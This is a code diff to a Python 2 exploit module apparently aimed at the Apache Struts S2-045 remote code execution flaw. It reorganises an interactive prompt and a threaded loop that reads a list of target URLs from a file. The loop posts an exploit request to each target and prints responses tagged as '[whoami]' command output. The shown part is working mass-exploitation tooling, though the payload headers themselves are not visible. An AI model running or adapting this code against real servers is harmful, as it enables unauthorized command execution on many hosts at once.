@@ -14,13 +14,13 @@ threads = options[3]
 
 def exp():
 
-    ksf_1 = ksf_line("exp","s2_045")
-    com = raw_input(ksf_1)
-    
     global url
     global files
     global cmd
     global threads
+
+    ksf_1 = ksf_line("exp","s2_045")
+    com = raw_input(ksf_1)
 
     try:
         if com[0:7] == 'set url':
@@ -80,19 +80,18 @@ def exp():
                 }
 
             if files:
-                cmd = "whoami"
                 threads_list = []
                 url_queue = Queue.Queue()
 
                 with open(files,'r') as f:
                     for line in f.readlines():    
                         url_queue.put(line.rstrip())
-
+                print tag_info + "Exploiting S2_045 Vul..."
                 def do(url):
                     try:
                         r = requests.post(url, data=data, headers=header, timeout=10)
-                        if len(r.content) < 60:
-                            print tag_vul + url +"\t" + " [whoami] => " + r.content
+                        if len(r.content) < 60 and len(r.content) > 1:
+                            print tag_vul + url +"\t" + " [whoami] => " + r.content,
                         else:
                             pass
                     except:pass
